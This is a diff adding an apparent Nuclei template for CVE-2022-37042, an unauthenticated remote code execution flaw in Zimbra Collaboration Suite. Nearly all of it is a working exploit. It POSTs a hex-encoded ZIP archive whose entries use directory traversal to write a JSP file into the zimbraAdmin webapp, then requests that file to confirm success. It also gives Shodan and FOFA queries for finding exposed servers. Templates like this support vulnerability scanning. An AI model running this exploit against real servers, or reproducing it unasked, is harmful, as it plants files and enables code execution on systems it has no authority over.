@@ -1,0 +1,43 @@
+id: CVE-2022-37042
+
+info:
+  name: Zimbra Collaboration Suite - Unauthenticated RCE
+  author: momika233
+  severity: critical
+  description: |
+    Zimbra Collaboration Suite (ZCS) 8.8.15 and 9.0 has mboximport functionality that receives a ZIP archive and extracts files from it. By bypassing authentication (i.e., not having an authtoken), an attacker can upload arbitrary files to the system, leading to directory traversal and remote code execution. This issue exists because of an incomplete fix for CVE-2022-27925.
+  reference:
+    - https://github.com/momika233
+  metadata:
+    shodan-query: http.favicon.hash:"1624375939"
+    fofa-query: app="zimbra-邮件系统"
+  tags: cve,cve2022,zimbra,rce,unauth
+
+requests:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        content-type: application/x-www-form-urlencoded
+
+        {{hex_decode("504b030414000800080000000000000000000000000000000000320000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f7161786e622e6a73705c92516bdb3e14c5bf8afe82806e31e24fd60c8a9bb226eb60ac63635ef632f620cbc78e165776a5ab3521e4bb0fc510cadece413f5de91ceeedecdd683a08f7340e8197f2b7f9637462d7ebab22ebbdb6e130f2f0af8d23acbe92b3bbdbd97fb637318a8dc09ee19b28d6d93f0ea641386ed42b272c1d631a1194a5f234a6ba7776a245a7ea0343fcfc55d3318053f0e24cea06adf33843aa2efe2f6addc377bca5f274caafbb56a880e784c8ba037f066f874691c673327d54f2eb97eabb243a561c9cefc46e2971bdc09bf94d8b7ad1dccc17b52c23627483d763e21fa64f5032c96247e5da8ddbfcebe524f2fc8f3eb2f1164ade3f54924aab9d77ace685c78ba86003f8130ed508ab76995f1d18515131e154666ca378eb623e9d62d1454e352922dd29ab9be183f3a657f94e4c5e3fb968f5eabe7a787bfd1e763893ba39ab556a5b84d7457cc3344a0798e6d179282222edf172897029296fc07af08c3d53799addfd0d0000ffff504b0708398848ac6b01000015020000504b030414000800080000000000000000000000000000000000320000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f7161786e622e6a73705c92516bdb3e14c5bf8afe82806e31e24fd60c8a9bb226eb60ac63635ef632f620cbc78e165776a5ab3521e4bb0fc510cadece413f5de91ceeedecdd683a08f7340e8197f2b7f9637462d7ebab22ebbdb6e130f2f0af8d23acbe92b3bbdbd97fb637318a8dc09ee19b28d6d93f0ea641386ed42b272c1d631a1194a5f234a6ba7776a245a7ea0343fcfc55d3318053f0e24cea06adf33843aa2efe2f6addc377bca5f274caafbb56a880e784c8ba037f066f874691c673327d54f2eb97eabb243a561c9cefc46e2971bdc09bf94d8b7ad1dccc17b52c23627483d763e21fa64f5032c96247e5da8ddbfcebe524f2fc8f3eb2f1164ade3f54924aab9d77ace685c78ba86003f8130ed508ab76995f1d18515131e154666ca378eb623e9d62d1454e352922dd29ab9be183f3a657f94e4c5e3fb968f5eabe7a787bfd1e763893ba39ab556a5b84d7457cc3344a0798e6d179282222edf172897029296fc07af08c3d53799addfd0d0000ffff504b0708398848ac6b01000015020000504b0102140014000800080000000000398848ac6b010000150200003200000000000000000000000000000000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f7161786e622e6a7370504b0102140014000800080000000000398848ac6b010000150200003200000000000000000000000000cb0100002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f7161786e622e6a7370504b05060000000002000200c0000000960300000000")}}
+      - |
+        GET /zimbraAdmin/qaxnb.jsp HTTP/1.1
+        Host: {{Hostname}}
+    payloads:
+      path:
+        - /service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1
+        - /service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd
+
+    stop-at-first-match: true
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 401'
+          - 'status_code_2 == 200'
+          #- "contains(body_2,'NcbWd0XGajaWS4DmOvZaCkxL1aPEXOZu')"
+          condition: and
+
+# Enhanced by mp on 2022/05/16
